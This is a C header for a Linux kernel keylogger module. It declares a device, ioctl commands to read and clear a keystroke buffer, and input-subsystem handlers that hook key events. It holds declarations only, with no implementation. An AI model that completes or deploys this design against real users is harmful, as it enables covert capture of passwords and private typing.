#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/fs.h>
#include <linux/input.h>
#include <linux/ioctl.h>

#define DEVICE_NAME "keylogger"
#define MAX_BUFFER_SIZE 1024
#define IOCTL_GET_BUFFER_SIZE _IOR('k', 1, int)
#define IOCTL_GET_BUFFER_DATA _IOR('k', 2, char *)
#define IOCTL_SET_BUFFER_SIZE _IOR('k', 3, int)
#define IOCTL_CLEAR_BUFFER_DATA _IO('k', 4)

#define MAP_SIZE 256

extern char map[MAP_SIZE];

static int allocate_buffer(int size);
static void free_buffer(void);

static long keylogger_ioctl(struct file *file, unsigned int cmd,
			    unsigned long arg);
static void keylogger_event_handler(struct input_handle *handle,
				    unsigned int type, unsigned int code,
				    int value);
static int keylogger_connect(struct input_handler *handler,
			     struct input_dev *dev,
			     const struct input_device_id *id);
static void keylogger_disconnect(struct input_handle *handle);

static int __init keylogger_init(void);
static void __exit keylogger_exit(void);

#endif /* KEYLOGGER_H */
